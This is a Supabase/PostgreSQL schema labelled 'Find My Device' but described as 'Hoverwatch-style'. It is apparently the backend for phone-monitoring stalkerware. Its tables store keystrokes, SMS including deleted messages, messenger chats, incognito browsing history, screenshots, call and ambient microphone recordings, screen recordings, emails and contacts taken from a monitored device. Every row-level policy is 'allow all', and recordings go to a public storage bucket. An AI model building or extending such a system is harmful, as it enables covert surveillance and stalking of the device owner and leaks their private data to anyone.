-- Full Hoverwatch-style Schema for Find My Device

-- Create devices table
CREATE TABLE IF NOT EXISTS devices (
    id UUID DEFAULT gen_random_uuid() PRIMARY KEY,
    device_name TEXT,
    device_token TEXT,
    created_at TIMESTAMP WITH TIME ZONE DEFAULT NOW(),
    last_seen TIMESTAMP WITH TIME ZONE
);

-- Create locations table
CREATE TABLE IF NOT EXISTS locations (
    id UUID DEFAULT gen_random_uuid() PRIMARY KEY,
    device_id UUID REFERENCES devices(id) ON DELETE CASCADE,
    latitude DOUBLE PRECISION,
    longitude DOUBLE PRECISION,
    accuracy REAL,
    battery_level INTEGER,
    is_charging BOOLEAN,
    recorded_at TIMESTAMP WITH TIME ZONE DEFAULT NOW()
);

-- Create call logs table
CREATE TABLE IF NOT EXISTS call_logs (
    id UUID DEFAULT gen_random_uuid() PRIMARY KEY,
    device_id UUID REFERENCES devices(id) ON DELETE CASCADE,
    contact_name TEXT,
    phone_number TEXT,
    call_type TEXT, -- incoming, outgoing, missed
    duration INTEGER, -- seconds
    recorded_at TIMESTAMP WITH TIME ZONE DEFAULT NOW()
);

-- Create sms table
CREATE TABLE IF NOT EXISTS sms (
    id UUID DEFAULT gen_random_uuid() PRIMARY KEY,
    device_id UUID REFERENCES devices(id) ON DELETE CASCADE,
    contact_name TEXT,
    phone_number TEXT,
    message_type TEXT, -- sent, received
    content TEXT,
    is_deleted BOOLEAN DEFAULT FALSE,
    recorded_at TIMESTAMP WITH TIME ZONE DEFAULT NOW()
);

-- Create messenger messages table
CREATE TABLE IF NOT EXISTS messenger_messages (
    id UUID DEFAULT gen_random_uuid() PRIMARY KEY,
    device_id UUID REFERENCES devices(id) ON DELETE CASCADE,
    messenger_type TEXT, -- whatsapp, facebook, snapchat, telegram, instagram
    contact_name TEXT,
    content TEXT,
    message_type TEXT, -- sent, received
    recorded_at TIMESTAMP WITH TIME ZONE DEFAULT NOW()
);

-- Create web history table
CREATE TABLE IF NOT EXISTS web_history (
    id UUID DEFAULT gen_random_uuid() PRIMARY KEY,
    device_id UUID REFERENCES devices(id) ON DELETE CASCADE,
    url TEXT,
    title TEXT,
    entry_time TIMESTAMP WITH TIME ZONE,
    exit_time TIMESTAMP WITH TIME ZONE,
    duration_seconds BIGINT,
    browsing_mode TEXT DEFAULT 'standard', -- 'standard' or 'incognito'
    recorded_at TIMESTAMP WITH TIME ZONE DEFAULT NOW()
);

-- Create app usage table
CREATE TABLE IF NOT EXISTS app_usage (
    id UUID DEFAULT gen_random_uuid() PRIMARY KEY,
    device_id UUID REFERENCES devices(id) ON DELETE CASCADE,
    package_name TEXT,
    app_name TEXT,
    usage_time INTEGER, -- seconds
    recorded_at TIMESTAMP WITH TIME ZONE DEFAULT NOW()
);

-- Create photos table
CREATE TABLE IF NOT EXISTS photos (
    id UUID DEFAULT gen_random_uuid() PRIMARY KEY,
    device_id UUID REFERENCES devices(id) ON DELETE CASCADE,
    photo_url TEXT,
    thumbnail_url TEXT,
    recorded_at TIMESTAMP WITH TIME ZONE DEFAULT NOW()
);

-- Create screenshots table
CREATE TABLE IF NOT EXISTS screenshots (
    id UUID DEFAULT gen_random_uuid() PRIMARY KEY,
    device_id UUID REFERENCES devices(id) ON DELETE CASCADE,
    screenshot_url TEXT,
    recorded_at TIMESTAMP WITH TIME ZONE DEFAULT NOW()
);

-- Create keystrokes table
CREATE TABLE IF NOT EXISTS keystrokes (
    id UUID DEFAULT gen_random_uuid() PRIMARY KEY,
    device_id UUID REFERENCES devices(id) ON DELETE CASCADE,
    text_content TEXT,
    app_name TEXT,
    recorded_at TIMESTAMP WITH TIME ZONE DEFAULT NOW()
);

-- Create sim change table
CREATE TABLE IF NOT EXISTS sim_changes (
    id UUID DEFAULT gen_random_uuid() PRIMARY KEY,
    device_id UUID REFERENCES devices(id) ON DELETE CASCADE,
    old_imsi TEXT,
    new_imsi TEXT,
    recorded_at TIMESTAMP WITH TIME ZONE DEFAULT NOW()
);

-- Create contacts table
CREATE TABLE IF NOT EXISTS contacts (
    id UUID DEFAULT gen_random_uuid() PRIMARY KEY,
    device_id UUID REFERENCES devices(id) ON DELETE CASCADE,
    contact_id TEXT,
    display_name TEXT,
    phone_numbers TEXT[],
    emails TEXT[],
    photo_uri TEXT,
    recorded_at TIMESTAMP WITH TIME ZONE DEFAULT NOW()
);

-- Create call recordings table
CREATE TABLE IF NOT EXISTS call_recordings (
    id UUID DEFAULT gen_random_uuid() PRIMARY KEY,
    device_id UUID REFERENCES devices(id) ON DELETE CASCADE,
    file_url TEXT,
    contact_name TEXT,
    phone_number TEXT,
    call_type TEXT,
    duration_seconds BIGINT,
    recorded_at TIMESTAMP WITH TIME ZONE DEFAULT NOW()
);

-- Create email entries table
CREATE TABLE IF NOT EXISTS email_entries (
    id UUID DEFAULT gen_random_uuid() PRIMARY KEY,
    device_id UUID REFERENCES devices(id) ON DELETE CASCADE,
    from_address TEXT,
    to_addresses TEXT[],
    subject TEXT,
    body TEXT,
    recorded_at TIMESTAMP WITH TIME ZONE DEFAULT NOW()
);

-- Create ambient recordings table
CREATE TABLE IF NOT EXISTS ambient_recordings (
    id UUID DEFAULT gen_random_uuid() PRIMARY KEY,
    device_id UUID REFERENCES devices(id) ON DELETE CASCADE,
    file_url TEXT,
    duration_seconds BIGINT,
    recorded_at TIMESTAMP WITH TIME ZONE DEFAULT NOW()
);

-- Create screen recordings table
CREATE TABLE IF NOT EXISTS screen_recordings (
    id UUID DEFAULT gen_random_uuid() PRIMARY KEY,
    device_id UUID REFERENCES devices(id) ON DELETE CASCADE,
    file_url TEXT,
    duration_seconds BIGINT,
    recorded_at TIMESTAMP WITH TIME ZONE DEFAULT NOW()
);

-- Create risk alerts table
CREATE TABLE IF NOT EXISTS risk_alerts (
    id UUID DEFAULT gen_random_uuid() PRIMARY KEY,
    device_id UUID REFERENCES devices(id) ON DELETE CASCADE,
    alert_type TEXT,
    description TEXT,
    source TEXT,
    content TEXT,
    recorded_at TIMESTAMP WITH TIME ZONE DEFAULT NOW()
);

-- Enable RLS
ALTER TABLE devices ENABLE ROW LEVEL SECURITY;
ALTER TABLE locations ENABLE ROW LEVEL SECURITY;
ALTER TABLE call_logs ENABLE ROW LEVEL SECURITY;
ALTER TABLE sms ENABLE ROW LEVEL SECURITY;
ALTER TABLE messenger_messages ENABLE ROW LEVEL SECURITY;
ALTER TABLE web_history ENABLE ROW LEVEL SECURITY;
ALTER TABLE app_usage ENABLE ROW LEVEL SECURITY;
ALTER TABLE photos ENABLE ROW LEVEL SECURITY;
ALTER TABLE screenshots ENABLE ROW LEVEL SECURITY;
ALTER TABLE keystrokes ENABLE ROW LEVEL SECURITY;
ALTER TABLE sim_changes ENABLE ROW LEVEL SECURITY;
ALTER TABLE contacts ENABLE ROW LEVEL SECURITY;
ALTER TABLE call_recordings ENABLE ROW LEVEL SECURITY;
ALTER TABLE email_entries ENABLE ROW LEVEL SECURITY;

-- Demo policies (allow all for testing)
CREATE POLICY "Allow all on devices" ON devices FOR ALL USING (true);
CREATE POLICY "Allow all on locations" ON locations FOR ALL USING (true);
CREATE POLICY "Allow all on call_logs" ON call_logs FOR ALL USING (true);
CREATE POLICY "Allow all on sms" ON sms FOR ALL USING (true);
CREATE POLICY "Allow all on messenger_messages" ON messenger_messages FOR ALL USING (true);
CREATE POLICY "Allow all on web_history" ON web_history FOR ALL USING (true);
CREATE POLICY "Allow all on app_usage" ON app_usage FOR ALL USING (true);
CREATE POLICY "Allow all on photos" ON photos FOR ALL USING (true);
CREATE POLICY "Allow all on screenshots" ON screenshots FOR ALL USING (true);
CREATE POLICY "Allow all on keystrokes" ON keystrokes FOR ALL USING (true);
CREATE POLICY "Allow all on sim_changes" ON sim_changes FOR ALL USING (true);
CREATE POLICY "Allow all on contacts" ON contacts FOR ALL USING (true);
CREATE POLICY "Allow all on call_recordings" ON call_recordings FOR ALL USING (true);
CREATE POLICY "Allow all on email_entries" ON email_entries FOR ALL USING (true);
CREATE POLICY "Allow all on ambient_recordings" ON ambient_recordings FOR ALL USING (true);
CREATE POLICY "Allow all on screen_recordings" ON screen_recordings FOR ALL USING (true);
CREATE POLICY "Allow all on risk_alerts" ON risk_alerts FOR ALL USING (true);

-- =============================================
-- SUPABASE STORAGE SETUP (FOR IMAGES/RECORDINGS)
-- =============================================
-- NOTE: You also need to create the bucket manually in Supabase Dashboard first!
-- Create a public bucket named "media" in Supabase Storage
-- Then run these policies

-- Storage policies for media bucket
-- Allow public read access
CREATE POLICY "Public Access"
ON storage.objects FOR SELECT
USING ( bucket_id = 'media' );

-- Allow authenticated users to upload
CREATE POLICY "Authenticated can upload"
ON storage.objects FOR INSERT
TO authenticated
WITH CHECK ( bucket_id = 'media' );

-- Allow authenticated users to delete
CREATE POLICY "Authenticated can delete"
ON storage.objects FOR DELETE
TO authenticated
USING ( bucket_id = 'media' );
